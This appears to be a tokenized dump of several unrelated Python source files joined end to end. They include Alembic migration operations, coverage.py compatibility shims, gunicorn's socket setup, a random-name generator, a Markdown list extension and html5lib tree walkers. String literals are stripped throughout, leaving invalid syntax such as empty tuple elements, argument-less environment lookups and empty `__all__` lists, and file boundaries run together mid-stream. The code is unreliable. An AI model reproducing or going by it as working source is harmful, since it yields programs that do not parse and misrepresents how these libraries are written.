: sa_schema . PrimaryKeyConstraint , \n 
: sa_schema . UniqueConstraint , \n 
: lambda name : sa_schema . CheckConstraint ( "" , name = name ) , \n 
None : sa_schema . Constraint \n 
} \n 
try : \n 
~~~ const = types [ type_ ] \n 
~~ except KeyError : \n 
~~~ raise TypeError ( "\'type\' can be one of %s" % \n 
", " . join ( sorted ( repr ( x ) for x in types ) ) ) \n 
\n 
~~ const = const ( name = name ) \n 
t . append_constraint ( const ) \n 
self . impl . drop_constraint ( const ) \n 
\n 
~~ def bulk_insert ( self , table , rows ) : \n 
~~~ """Issue a "bulk insert" operation using the current\n        migration context.\n\n        This provides a means of representing an INSERT of multiple rows\n        which works equally well in the context of executing on a live\n        connection as well as that of generating a SQL script.   In the\n        case of a SQL script, the values are rendered inline into the\n        statement.\n\n        e.g.::\n\n            from alembic import op\n            from datetime import date\n            from sqlalchemy.sql import table, column\n            from sqlalchemy import String, Integer, Date\n\n            # Create an ad-hoc table to use for the insert statement.\n            accounts_table = table(\'account\',\n                column(\'id\', Integer),\n                column(\'name\', String),\n                column(\'create_date\', Date)\n            )\n\n            op.bulk_insert(accounts_table,\n                [\n                    {\'id\':1, \'name\':\'John Smith\',\n                            \'create_date\':date(2010, 10, 5)},\n                    {\'id\':2, \'name\':\'Ed Williams\',\n                            \'create_date\':date(2007, 5, 27)},\n                    {\'id\':3, \'name\':\'Wendy Jones\',\n                            \'create_date\':date(2008, 8, 15)},\n                ]\n            )\n          """ \n 
self . impl . bulk_insert ( table , rows ) \n 
\n 
~~ def inline_literal ( self , value , type_ = None ) : \n 
~~~ """Produce an \'inline literal\' expression, suitable for\n        using in an INSERT, UPDATE, or DELETE statement.\n\n        When using Alembic in "offline" mode, CRUD operations\n        aren\'t compatible with SQLAlchemy\'s default behavior surrounding\n        literal values,\n        which is that they are converted into bound values and passed\n        separately into the ``execute()`` method of the DBAPI cursor.\n        An offline SQL\n        script needs to have these rendered inline.  While it should\n        always be noted that inline literal values are an **enormous**\n        security hole in an application that handles untrusted input,\n        a schema migration is not run in this context, so\n        literals are safe to render inline, with the caveat that\n        advanced types like dates may not be supported directly\n        by SQLAlchemy.\n\n        See :meth:`.execute` for an example usage of\n        :meth:`.inline_literal`.\n\n        :param value: The value to render.  Strings, integers, and simple\n         numerics should be supported.   Other types like boolean,\n         dates, etc. may or may not be supported yet by various\n         backends.\n        :param ``type_``: optional - a :class:`sqlalchemy.types.TypeEngine`\n         subclass stating the type of this value.  In SQLAlchemy\n         expressions, this is usually derived automatically\n         from the Python type of the value itself, as well as\n         based on the context in which the value is used.\n\n        """ \n 
return impl . _literal_bindparam ( None , value , type_ = type_ ) \n 
\n 
~~ def execute ( self , sql , execution_options = None ) : \n 
~~~ """Execute the given SQL using the current migration context.\n\n        In a SQL script context, the statement is emitted directly to the\n        output stream.   There is *no* return result, however, as this\n        function is oriented towards generating a change script\n        that can run in "offline" mode.  For full interaction\n        with a connected database, use the "bind" available\n        from the context::\n\n            from alembic import op\n            connection = op.get_bind()\n\n        Also note that any parameterized statement here *will not work*\n        in offline mode - INSERT, UPDATE and DELETE statements which refer\n        to literal values would need to render\n        inline expressions.   For simple use cases, the\n        :meth:`.inline_literal` function can be used for **rudimentary**\n        quoting of string values.  For "bulk" inserts, consider using\n        :meth:`.bulk_insert`.\n\n        For example, to emit an UPDATE statement which is equally\n        compatible with both online and offline mode::\n\n            from sqlalchemy.sql import table, column\n            from sqlalchemy import String\n            from alembic import op\n\n            account = table(\'account\',\n                column(\'name\', String)\n            )\n            op.execute(\n                account.update().\\\\\n                    where(account.c.name==op.inline_literal(\'account 1\')).\\\\\n                    values({\'name\':op.inline_literal(\'account 2\')})\n                    )\n\n        Note above we also used the SQLAlchemy\n        :func:`sqlalchemy.sql.expression.table`\n        and :func:`sqlalchemy.sql.expression.column` constructs to make a brief,\n        ad-hoc table construct just for our UPDATE statement.  A full\n        :class:`~sqlalchemy.schema.Table` construct of course works perfectly\n        fine as well, though note it\'s a recommended practice to at least ensure\n        the definition of a table is self-contained within the migration script,\n        rather than imported from a module that may break compatibility with\n        older migrations.\n\n        :param sql: Any legal SQLAlchemy expression, including:\n\n        * a string\n        * a :func:`sqlalchemy.sql.expression.text` construct.\n        * a :func:`sqlalchemy.sql.expression.insert` construct.\n        * a :func:`sqlalchemy.sql.expression.update`,\n          :func:`sqlalchemy.sql.expression.insert`,\n          or :func:`sqlalchemy.sql.expression.delete`  construct.\n        * Pretty much anything that\'s "executable" as described\n          in :ref:`sqlexpression_toplevel`.\n\n        :param execution_options: Optional dictionary of\n         execution options, will be passed to\n         :meth:`sqlalchemy.engine.Connection.execution_options`.\n        """ \n 
self . migration_context . impl . execute ( sql , \n 
execution_options = execution_options ) \n 
\n 
~~ def get_bind ( self ) : \n 
~~~ """Return the current \'bind\'.\n\n        Under normal circumstances, this is the\n        :class:`~sqlalchemy.engine.Connection` currently being used\n        to emit SQL to the database.\n\n        In a SQL script context, this value is ``None``. [TODO: verify this]\n\n        """ \n 
return self . migration_context . impl . bind \n 
\n 
~~ ~~ """Add things to old Pythons so I can pretend they are newer.""" \n 
\n 
# This file does lots of tricky stuff, so disable a bunch of lintisms. \n 
# pylint: disable=F0401,W0611,W0622 \n 
# F0401: Unable to import blah \n 
# W0611: Unused import blah \n 
# W0622: Redefining built-in blah \n 
\n 
import os , re , sys \n 
\n 
\n 
try : \n 
~~~ set = set # new in 2.4 \n 
~~ except NameError : \n 
~~~ from sets import Set as set \n 
\n 
\n 
~~ try : \n 
~~~ sorted = sorted \n 
~~ except NameError : \n 
~~~ def sorted ( iterable ) : \n 
~~~ """A 2.3-compatible implementation of `sorted`.""" \n 
lst = list ( iterable ) \n 
lst . sort ( ) \n 
return lst \n 
\n 
\n 
~~ ~~ try : \n 
~~~ reversed = reversed \n 
~~ except NameError : \n 
~~~ def reversed ( iterable ) : \n 
~~~ """A 2.3-compatible implementation of `reversed`.""" \n 
lst = list ( iterable ) \n 
return lst [ : : - 1 ] \n 
\n 
# rpartition is new in 2.5 \n 
~~ ~~ try : \n 
~~~ "" . rpartition \n 
~~ except AttributeError : \n 
~~~ def rpartition ( s , sep ) : \n 
~~~ """Implement s.rpartition(sep) for old Pythons.""" \n 
i = s . rfind ( sep ) \n 
if i == - 1 : \n 
~~~ return ( , , s ) \n 
~~ else : \n 
~~~ return ( s [ : i ] , sep , s [ i + len ( sep ) : ] ) \n 
~~ ~~ ~~ else : \n 
~~~ def rpartition ( s , sep ) : \n 
~~~ """A common interface for new Pythons.""" \n 
return s . rpartition ( sep ) \n 
\n 
# Pythons 2 and 3 differ on where to get StringIO \n 
~~ ~~ try : \n 
~~~ from cStringIO import StringIO \n 
BytesIO = StringIO \n 
~~ except ImportError : \n 
~~~ from io import StringIO , BytesIO \n 
\n 
\n 
~~ try : \n 
~~~ string_class = basestring \n 
~~ except NameError : \n 
~~~ string_class = str \n 
\n 
# Where do pickles come from? \n 
~~ try : \n 
~~~ import cPickle as pickle \n 
~~ except ImportError : \n 
~~~ import pickle \n 
\n 
# range or xrange? \n 
~~ try : \n 
~~~ range = xrange \n 
~~ except NameError : \n 
~~~ range = range \n 
\n 
\n 
~~ try : \n 
~~~ { } . iteritems \n 
~~ except AttributeError : \n 
~~~ def iitems ( d ) : \n 
~~~ """Produce the items from dict `d`.""" \n 
return d . items ( ) \n 
~~ ~~ else : \n 
~~~ def iitems ( d ) : \n 
~~~ """Produce the items from dict `d`.""" \n 
return d . iteritems ( ) \n 
\n 
# Exec is a statement in Py2, a function in Py3 \n 
~~ ~~ if sys . version_info >= ( 3 , 0 ) : \n 
~~~ def exec_code_object ( code , global_map ) : \n 
~~~ """A wrapper around exec().""" \n 
exec ( code , global_map ) \n 
~~ ~~ else : \n 
# OK, this is pretty gross.  In Py2, exec was a statement, but that will \n 
# be a syntax error if we try to put it in a Py3 file, even if it is never \n 
# executed.  So hide it inside an evaluated string literal instead. \n 
~~~ eval ( \n 
compile ( \n 
"def exec_code_object(code, global_map):\\n" \n 
"    exec code in global_map\\n" , \n 
"<exec_function>" , "exec" \n 
) \n 
) \n 
\n 
# Reading Python source and interpreting the coding comment is a big deal. \n 
~~ if sys . version_info >= ( 3 , 0 ) : \n 
# Python 3.2 provides `tokenize.open`, the best way to open source files. \n 
~~~ import tokenize \n 
try : \n 
~~~ open_source = tokenize . open # pylint: disable=E1101 \n 
~~ except AttributeError : \n 
~~~ from io import TextIOWrapper \n 
detect_encoding = tokenize . detect_encoding # pylint: disable=E1101 \n 
# Copied from the 3.2 stdlib: \n 
def open_source ( fname ) : \n 
~~~ """Open a file in read only mode using the encoding detected by\n            detect_encoding().\n            """ \n 
buffer = open ( fname , ) \n 
encoding , _ = detect_encoding ( buffer . readline ) \n 
buffer . seek ( 0 ) \n 
text = TextIOWrapper ( buffer , encoding , line_buffering = True ) \n 
text . mode = \n 
return text \n 
~~ ~~ ~~ else : \n 
~~~ def open_source ( fname ) : \n 
~~~ """Open a source file the best way.""" \n 
return open ( fname , "rU" ) \n 
\n 
\n 
# Python 3.x is picky about bytes and strings, so provide methods to \n 
# get them right, and make them no-ops in 2.x \n 
~~ ~~ if sys . version_info >= ( 3 , 0 ) : \n 
~~~ def to_bytes ( s ) : \n 
~~~ """Convert string `s` to bytes.""" \n 
return s . encode ( ) \n 
\n 
~~ def to_string ( b ) : \n 
~~~ """Convert bytes `b` to a string.""" \n 
return b . decode ( ) \n 
\n 
~~ def binary_bytes ( byte_values ) : \n 
~~~ """Produce a byte string with the ints from `byte_values`.""" \n 
return bytes ( byte_values ) \n 
\n 
~~ def byte_to_int ( byte_value ) : \n 
~~~ """Turn an element of a bytes object into an int.""" \n 
return byte_value \n 
\n 
~~ def bytes_to_ints ( bytes_value ) : \n 
~~~ """Turn a bytes object into a sequence of ints.""" \n 
# In Py3, iterating bytes gives ints. \n 
return bytes_value \n 
\n 
~~ ~~ else : \n 
~~~ def to_bytes ( s ) : \n 
~~~ """Convert string `s` to bytes (no-op in 2.x).""" \n 
return s \n 
\n 
~~ def to_string ( b ) : \n 
~~~ """Convert bytes `b` to a string (no-op in 2.x).""" \n 
return b \n 
\n 
~~ def binary_bytes ( byte_values ) : \n 
~~~ """Produce a byte string with the ints from `byte_values`.""" \n 
return "" . join ( [ chr ( b ) for b in byte_values ] ) \n 
\n 
~~ def byte_to_int ( byte_value ) : \n 
~~~ """Turn an element of a bytes object into an int.""" \n 
return ord ( byte_value ) \n 
\n 
~~ def bytes_to_ints ( bytes_value ) : \n 
~~~ """Turn a bytes object into a sequence of ints.""" \n 
for byte in bytes_value : \n 
~~~ yield ord ( byte ) \n 
\n 
# Md5 is available in different places. \n 
~~ ~~ ~~ try : \n 
~~~ import hashlib \n 
md5 = hashlib . md5 \n 
~~ except ImportError : \n 
~~~ import md5 \n 
md5 = md5 . new \n 
~~ from wtforms . fields import TextAreaField \n 
from . widgets import PageDown \n 
\n 
class PageDownField ( TextAreaField ) : \n 
~~~ widget = PageDown ( ) \n 
\n 
# -*- coding: utf-8 -*- \n 
# Copyright (C) 2012 by Tomasz Wjcik <labs@tomekwojcik.pl> \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
\n 
~~ """Generate random names and name-related strings.""" \n 
\n 
import random \n 
\n 
from . . dictionaries_loader import get_dictionary \n 
\n 
__all__ = [ \n 
, , , , \n 
, , , , \n 
, , , \n 
] \n 
\n 
\n 
def first_name ( ) : \n 
~~~ """Random male of female first name.""" \n 
_dict = get_dictionary ( ) \n 
_dict += get_dictionary ( ) \n 
\n 
return random . choice ( _dict ) . strip ( ) \n 
\n 
\n 
~~ def last_name ( ) : \n 
~~~ """Random last name.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def full_name ( ) : \n 
~~~ """\n    Random full name. Equivalent of ``first_name() + \' \' + last_name()``.\n    """ \n 
return first_name ( ) + + last_name ( ) \n 
\n 
\n 
~~ def male_first_name ( ) : \n 
~~~ """Random male first name.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def female_first_name ( ) : \n 
~~~ """Random female first name.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def company_name ( ) : \n 
~~~ """Random company name.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def job_title ( ) : \n 
~~~ """Random job title.""" \n 
result = random . choice ( get_dictionary ( ) ) . strip ( ) \n 
result = result . replace ( , job_title_suffix ( ) ) \n 
return result \n 
\n 
\n 
~~ def job_title_suffix ( ) : \n 
~~~ """Random job title suffix.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def title ( ) : \n 
~~~ """Random name title, e.g. ``Mr``.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def suffix ( ) : \n 
~~~ """Random name suffix, e.g. ``Jr``.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def location ( ) : \n 
~~~ """Random location name, e.g. ``MI6 Headquarters``.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
\n 
\n 
~~ def industry ( ) : \n 
~~~ """Random industry name.""" \n 
return random . choice ( get_dictionary ( ) ) . strip ( ) \n 
# -*- coding: utf-8 - \n 
# \n 
# This file is part of gunicorn released under the MIT license. \n 
# See the NOTICE for more information. \n 
\n 
~~ import errno \n 
import os \n 
import socket \n 
import stat \n 
import sys \n 
import time \n 
\n 
from gunicorn import util \n 
from gunicorn . six import string_types \n 
\n 
SD_LISTEN_FDS_START = 3 \n 
\n 
\n 
class BaseSocket ( object ) : \n 
\n 
~~~ def __init__ ( self , address , conf , log , fd = None ) : \n 
~~~ self . log = log \n 
self . conf = conf \n 
\n 
self . cfg_addr = address \n 
if fd is None : \n 
~~~ sock = socket . socket ( self . FAMILY , socket . SOCK_STREAM ) \n 
~~ else : \n 
~~~ sock = socket . fromfd ( fd , self . FAMILY , socket . SOCK_STREAM ) \n 
\n 
~~ self . sock = self . set_options ( sock , bound = ( fd is not None ) ) \n 
\n 
~~ def __str__ ( self , name ) : \n 
~~~ return "<socket %d>" % self . sock . fileno ( ) \n 
\n 
~~ def __getattr__ ( self , name ) : \n 
~~~ return getattr ( self . sock , name ) \n 
\n 
~~ def set_options ( self , sock , bound = False ) : \n 
~~~ sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) \n 
if not bound : \n 
~~~ self . bind ( sock ) \n 
~~ sock . setblocking ( 0 ) \n 
\n 
# make sure that the socket can be inherited \n 
if hasattr ( sock , "set_inheritable" ) : \n 
~~~ sock . set_inheritable ( True ) \n 
\n 
~~ sock . listen ( self . conf . backlog ) \n 
return sock \n 
\n 
~~ def bind ( self , sock ) : \n 
~~~ sock . bind ( self . cfg_addr ) \n 
\n 
~~ def close ( self ) : \n 
~~~ try : \n 
~~~ self . sock . close ( ) \n 
~~ except socket . error as e : \n 
~~~ self . log . info ( "Error while closing socket %s" , str ( e ) ) \n 
~~ del self . sock \n 
\n 
\n 
~~ ~~ class TCPSocket ( BaseSocket ) : \n 
\n 
~~~ FAMILY = socket . AF_INET \n 
\n 
def __str__ ( self ) : \n 
~~~ if self . conf . is_ssl : \n 
~~~ scheme = "https" \n 
~~ else : \n 
~~~ scheme = "http" \n 
\n 
~~ addr = self . sock . getsockname ( ) \n 
return "%s://%s:%d" % ( scheme , addr [ 0 ] , addr [ 1 ] ) \n 
\n 
~~ def set_options ( self , sock , bound = False ) : \n 
~~~ sock . setsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY , 1 ) \n 
return super ( TCPSocket , self ) . set_options ( sock , bound = bound ) \n 
\n 
\n 
~~ ~~ class TCP6Socket ( TCPSocket ) : \n 
\n 
~~~ FAMILY = socket . AF_INET6 \n 
\n 
def __str__ ( self ) : \n 
~~~ ( host , port , fl , sc ) = self . sock . getsockname ( ) \n 
return "http://[%s]:%d" % ( host , port ) \n 
\n 
\n 
~~ ~~ class UnixSocket ( BaseSocket ) : \n 
\n 
~~~ FAMILY = socket . AF_UNIX \n 
\n 
def __init__ ( self , addr , conf , log , fd = None ) : \n 
~~~ if fd is None : \n 
~~~ try : \n 
~~~ st = os . stat ( addr ) \n 
~~ except OSError as e : \n 
~~~ if e . args [ 0 ] != errno . ENOENT : \n 
~~~ raise \n 
~~ ~~ else : \n 
~~~ if stat . S_ISSOCK ( st . st_mode ) : \n 
~~~ os . remove ( addr ) \n 
~~ else : \n 
~~~ raise ValueError ( "%r is not a socket" % addr ) \n 
~~ ~~ ~~ self . parent = os . getpid ( ) \n 
super ( UnixSocket , self ) . __init__ ( addr , conf , log , fd = fd ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return "unix:%s" % self . cfg_addr \n 
\n 
~~ def bind ( self , sock ) : \n 
~~~ old_umask = os . umask ( self . conf . umask ) \n 
sock . bind ( self . cfg_addr ) \n 
util . chown ( self . cfg_addr , self . conf . uid , self . conf . gid ) \n 
os . umask ( old_umask ) \n 
\n 
\n 
~~ def close ( self ) : \n 
~~~ super ( UnixSocket , self ) . close ( ) \n 
if self . parent == os . getpid ( ) : \n 
~~~ os . unlink ( self . cfg_addr ) \n 
\n 
\n 
~~ ~~ ~~ def _sock_type ( addr ) : \n 
~~~ if isinstance ( addr , tuple ) : \n 
~~~ if util . is_ipv6 ( addr [ 0 ] ) : \n 
~~~ sock_type = TCP6Socket \n 
~~ else : \n 
~~~ sock_type = TCPSocket \n 
~~ ~~ elif isinstance ( addr , string_types ) : \n 
~~~ sock_type = UnixSocket \n 
~~ else : \n 
~~~ raise TypeError ( "Unable to create socket from: %r" % addr ) \n 
~~ return sock_type \n 
\n 
\n 
~~ def create_sockets ( conf , log ) : \n 
~~~ """\n    Create a new socket for the given address. If the\n    address is a tuple, a TCP socket is created. If it\n    is a string, a Unix socket is created. Otherwise\n    a TypeError is raised.\n    """ \n 
\n 
# Systemd support, use the sockets managed by systemd and passed to \n 
# gunicorn. \n 
# http://www.freedesktop.org/software/systemd/man/systemd.socket.html \n 
listeners = [ ] \n 
if ( in os . environ \n 
and int ( os . environ . get ( ) ) == os . getpid ( ) ) : \n 
~~~ for i in range ( int ( os . environ . get ( , 0 ) ) ) : \n 
~~~ fd = i + SD_LISTEN_FDS_START \n 
try : \n 
~~~ sock = socket . fromfd ( fd , socket . AF_UNIX , socket . SOCK_STREAM ) \n 
sockname = sock . getsockname ( ) \n 
if isinstance ( sockname , str ) and sockname . startswith ( ) : \n 
~~~ listeners . append ( UnixSocket ( sockname , conf , log , fd = fd ) ) \n 
~~ elif len ( sockname ) == 2 and in sockname [ 0 ] : \n 
~~~ listeners . append ( TCPSocket ( "%s:%s" % sockname , conf , log , \n 
fd = fd ) ) \n 
~~ elif len ( sockname ) == 4 and in sockname [ 0 ] : \n 
~~~ listeners . append ( TCP6Socket ( "[%s]:%s" % sockname [ : 2 ] , conf , \n 
log , fd = fd ) ) \n 
~~ ~~ except socket . error : \n 
~~~ pass \n 
~~ ~~ del os . environ [ ] , os . environ [ ] \n 
\n 
if listeners : \n 
~~~ log . debug ( , \n 
"," . join ( [ str ( l ) for l in listeners ] ) ) \n 
return listeners \n 
\n 
# get it only once \n 
~~ ~~ laddr = conf . address \n 
\n 
# check ssl config early to raise the error on startup \n 
# only the certfile is needed since it can contains the keyfile \n 
if conf . certfile and not os . path . exists ( conf . certfile ) : \n 
~~~ raise ValueError ( \'certfile "%s" does not exist\' % conf . certfile ) \n 
\n 
~~ if conf . keyfile and not os . path . exists ( conf . keyfile ) : \n 
~~~ raise ValueError ( \'keyfile "%s" does not exist\' % conf . keyfile ) \n 
\n 
# sockets are already bound \n 
~~ if in os . environ : \n 
~~~ fds = os . environ . pop ( ) . split ( ) \n 
for i , fd in enumerate ( fds ) : \n 
~~~ fd = int ( fd ) \n 
addr = laddr [ i ] \n 
sock_type = _sock_type ( addr ) \n 
\n 
try : \n 
~~~ listeners . append ( sock_type ( addr , conf , log , fd = fd ) ) \n 
~~ except socket . error as e : \n 
~~~ if e . args [ 0 ] == errno . ENOTCONN : \n 
~~~ log . error ( "GUNICORN_FD should refer to an open socket." ) \n 
~~ else : \n 
~~~ raise \n 
~~ ~~ ~~ return listeners \n 
\n 
# no sockets is bound, first initialization of gunicorn in this env. \n 
~~ for addr in laddr : \n 
~~~ sock_type = _sock_type ( addr ) \n 
\n 
# If we fail to create a socket from GUNICORN_FD \n 
# we fall through and try and open the socket \n 
# normally. \n 
sock = None \n 
for i in range ( 5 ) : \n 
~~~ try : \n 
~~~ sock = sock_type ( addr , conf , log ) \n 
~~ except socket . error as e : \n 
~~~ if e . args [ 0 ] == errno . EADDRINUSE : \n 
~~~ log . error ( "Connection in use: %s" , str ( addr ) ) \n 
~~ if e . args [ 0 ] == errno . EADDRNOTAVAIL : \n 
~~~ log . error ( "Invalid address: %s" , str ( addr ) ) \n 
~~ if i < 5 : \n 
~~~ log . error ( "Retrying in 1 second." ) \n 
time . sleep ( 1 ) \n 
~~ ~~ else : \n 
~~~ break \n 
\n 
~~ ~~ if sock is None : \n 
~~~ log . error ( "Can\'t connect to %s" , str ( addr ) ) \n 
sys . exit ( 1 ) \n 
\n 
~~ listeners . append ( sock ) \n 
\n 
~~ return listeners \n 
~~ """\nPython 2/3 compatibility.\n\n""" \n 
#noinspection PyUnresolvedReferences \n 
from requests . compat import ( \n 
is_windows , \n 
bytes , \n 
str , \n 
is_py3 , \n 
is_py26 , \n 
) \n 
\n 
try : \n 
#noinspection PyUnresolvedReferences,PyCompatibility \n 
~~~ from urllib . parse import urlsplit \n 
~~ except ImportError : \n 
#noinspection PyUnresolvedReferences,PyCompatibility \n 
~~~ from urlparse import urlsplit \n 
~~ """\nSane List Extension for Python-Markdown\n=======================================\n\nModify the behavior of Lists in Python-Markdown t act in a sane manor.\n\nIn standard Markdown sytex, the following would constitute a single \nordered list. However, with this extension, the output would include \ntwo lists, the first an ordered list and the second and unordered list.\n\n    1. ordered\n    2. list\n\n    * unordered\n    * list\n\nCopyright 2011 - [Waylan Limberg](http://achinghead.com)\n\n""" \n 
\n 
from __future__ import absolute_import \n 
from __future__ import unicode_literals \n 
from . import Extension \n 
from . . blockprocessors import OListProcessor , UListProcessor \n 
import re \n 
\n 
\n 
class SaneOListProcessor ( OListProcessor ) : \n 
\n 
~~~ CHILD_RE = re . compile ( ) \n 
SIBLING_TAGS = [ ] \n 
\n 
\n 
~~ class SaneUListProcessor ( UListProcessor ) : \n 
\n 
~~~ CHILD_RE = re . compile ( ) \n 
SIBLING_TAGS = [ ] \n 
\n 
\n 
~~ class SaneListExtension ( Extension ) : \n 
~~~ """ Add sane lists to Markdown. """ \n 
\n 
def extendMarkdown ( self , md , md_globals ) : \n 
~~~ """ Override existing Processors. """ \n 
md . parser . blockprocessors [ ] = SaneOListProcessor ( md . parser ) \n 
md . parser . blockprocessors [ ] = SaneUListProcessor ( md . parser ) \n 
\n 
\n 
~~ ~~ def makeExtension ( configs = { } ) : \n 
~~~ return SaneListExtension ( configs = configs ) \n 
\n 
~~ from __future__ import absolute_import , division , unicode_literals \n 
from pip . _vendor . six import text_type \n 
\n 
import gettext \n 
_ = gettext . gettext \n 
\n 
from . . constants import voidElements , spaceCharacters \n 
spaceCharacters = "" . join ( spaceCharacters ) \n 
\n 
\n 
class TreeWalker ( object ) : \n 
~~~ def __init__ ( self , tree ) : \n 
~~~ self . tree = tree \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def error ( self , msg ) : \n 
~~~ return { "type" : "SerializeError" , "data" : msg } \n 
\n 
~~ def emptyTag ( self , namespace , name , attrs , hasChildren = False ) : \n 
~~~ assert namespace is None or isinstance ( namespace , text_type ) , type ( namespace ) \n 
assert isinstance ( name , text_type ) , type ( name ) \n 
assert all ( ( namespace is None or isinstance ( namespace , text_type ) ) and \n 
isinstance ( name , text_type ) and \n 
isinstance ( value , text_type ) \n 
for ( namespace , name ) , value in attrs . items ( ) ) \n 
\n 
yield { "type" : "EmptyTag" , "name" : name , \n 
"namespace" : namespace , \n 
"data" : attrs } \n 
if hasChildren : \n 
~~~ yield self . error ( _ ( "Void element has children" ) ) \n 
\n 
~~ ~~ def startTag ( self , namespace , name , attrs ) : \n 
~~~ assert namespace is None or isinstance ( namespace , text_type ) , type ( namespace ) \n 
assert isinstance ( name , text_type ) , type ( name ) \n 
assert all ( ( namespace is None or isinstance ( namespace , text_type ) ) and \n 
isinstance ( name , text_type ) and \n 
isinstance ( value , text_type ) \n 
for ( namespace , name ) , value in attrs . items ( ) ) \n 
\n 
return { "type" : "StartTag" , \n 
"name" : name , \n 
"namespace" : namespace , \n 
"data" : attrs } \n 
\n 
~~ def endTag ( self , namespace , name ) : \n 
~~~ assert namespace is None or isinstance ( namespace , text_type ) , type ( namespace ) \n 
assert isinstance ( name , text_type ) , type ( namespace ) \n 
\n 
return { "type" : "EndTag" , \n 
"name" : name , \n 
"namespace" : namespace , \n 
"data" : { } } \n 
\n 
~~ def text ( self , data ) : \n 
~~~ assert isinstance ( data , text_type ) , type ( data ) \n 
\n 
data = data \n 
middle = data . lstrip ( spaceCharacters ) \n 
left = data [ : len ( data ) - len ( middle ) ] \n 
if left : \n 
~~~ yield { "type" : "SpaceCharacters" , "data" : left } \n 
~~ data = middle \n 
middle = data . rstrip ( spaceCharacters ) \n 
right = data [ len ( middle ) : ] \n 
if middle : \n 
~~~ yield { "type" : "Characters" , "data" : middle } \n 
~~ if right : \n 
~~~ yield { "type" : "SpaceCharacters" , "data" : right } \n 
\n 
~~ ~~ def comment ( self , data ) : \n 
~~~ assert isinstance ( data , text_type ) , type ( data ) \n 
\n 
return { "type" : "Comment" , "data" : data } \n 
\n 
~~ def doctype ( self , name , publicId = None , systemId = None , correct = True ) : \n 
~~~ assert name is None or isinstance ( name , text_type ) , type ( name ) \n 
assert publicId is None or isinstance ( publicId , text_type ) , type ( publicId ) \n 
assert systemId is None or isinstance ( systemId , text_type ) , type ( systemId ) \n 
\n 
return { "type" : "Doctype" , \n 
"name" : name if name is not None else "" , \n 
"publicId" : publicId , \n 
"systemId" : systemId , \n 
"correct" : correct } \n 
\n 
~~ def entity ( self , name ) : \n 
~~~ assert isinstance ( name , text_type ) , type ( name ) \n 
\n 
return { "type" : "Entity" , "name" : name } \n 
\n 
~~ def unknown ( self , nodeType ) : \n 
~~~ return self . error ( _ ( "Unknown node type: " ) + nodeType ) \n 
\n 
\n 
~~ ~~ class RecursiveTreeWalker ( TreeWalker ) : \n 
~~~ def walkChildren ( self , node ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def element ( self , node , namespace , name , attrs , hasChildren ) : \n 
~~~ if name in voidElements : \n 
~~~ for token in self . emptyTag ( namespace , name , attrs , hasChildren ) : \n 
~~~ yield token \n 
~~ ~~ else : \n 
~~~ yield self . startTag ( name , attrs ) \n 
if hasChildren : \n 
~~~ for token in self . walkChildren ( node ) : \n 
~~~ yield token \n 
~~ ~~ yield self . endTag ( name ) \n 
\n 
~~ ~~ ~~ from xml . dom import Node \n 
\n 
DOCUMENT = Node . DOCUMENT_NODE \n 
DOCTYPE = Node . DOCUMENT_TYPE_NODE \n 
TEXT = Node . TEXT_NODE \n 
ELEMENT = Node . ELEMENT_NODE \n 
COMMENT = Node . COMMENT_NODE \n 
ENTITY = Node . ENTITY_NODE \n 
UNKNOWN = "<#UNKNOWN#>" \n 
\n 
\n 
class NonRecursiveTreeWalker ( TreeWalker ) : \n 
~~~ def getNodeDetails ( self , node ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def getFirstChild ( self , node ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def getNextSibling ( self , node ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def getParentNode ( self , node ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ currentNode = self . tree \n 
while currentNode is not None : \n 
~~~ details = self . getNodeDetails ( currentNode ) \n 
type , details = details [ 0 ] , details [ 1 : ] \n 
hasChildren = False \n 
\n 
if type == DOCTYPE : \n 
~~~ yield self . doctype ( * details ) \n 
\n 
~~ elif type == TEXT : \n 
~~~ for token in self . text ( * details ) : \n 
~~~ yield token \n 
\n 
~~ ~~ elif type == ELEMENT : \n 
~~~ namespace , name , attributes , hasChildren = details \n 
if name in voidElements : \n 
~~~ for token in self . emptyTag ( namespace , name , attributes , \n 
hasChildren ) : \n 
~~~ yield token \n 
~~ hasChildren = False \n 
~~ else : \n 
~~~ yield self . startTag ( namespace , name , attributes ) \n 
\n 
